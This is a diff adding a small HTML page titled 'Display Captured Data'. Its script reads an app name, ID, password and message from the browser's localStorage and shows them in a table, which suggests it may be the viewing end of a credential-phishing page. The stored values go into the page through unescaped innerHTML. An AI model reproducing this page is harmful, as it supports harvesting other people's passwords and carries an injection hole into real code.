@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Other Page</title>
+    <link rel="stylesheet" href="lo.css">
+    <!-- Your CSS and styling here -->
+    <style>
+        /* Add your CSS styles here */
+        table {
+            width: 80%;
+            margin: 20px auto;
+            border-collapse: collapse;
+        }
+
+        th, td {
+            border: 1px solid #ccc;
+            padding: 8px;
+            text-align: left;
+        }
+
+        th {
+            background-color: #f2f2f2;
+        }
+    </style>
+</head>
+<body>
+    <center>
+        <h1>Display Captured Data</h1>
+        <table>
+            <thead>
+                <tr>
+                    <th>APP NAME</th>
+                    <th>ID</th>
+                    <th>PASSWORD</th>
+                    <th>Message</th>
+                </tr>
+            </thead>
+            <tbody id="dataRows">
+            </tbody>
+        </table>
+    </center>
+<script>
+    // Function to add data to the array and update the table
+    function addData() {
+        var appName = localStorage.getItem('appName');
+        var id = localStorage.getItem('id');
+        var password = localStorage.getItem('password');
+        var message = localStorage.getItem('message');
+
+        if (appName && id && password && message) {
+            var newRow = document.createElement('tr');
+            newRow.innerHTML = `
+                <td>${appName}</td>
+                <td>${id}</td>
+                <td>${password}</td>
+                <td>${message}</td>
+            `;
+            document.getElementById('dataRows').appendChild(newRow);
+        }
+    }
+
+    addData();
+</script>
+
+</body>
+</html>
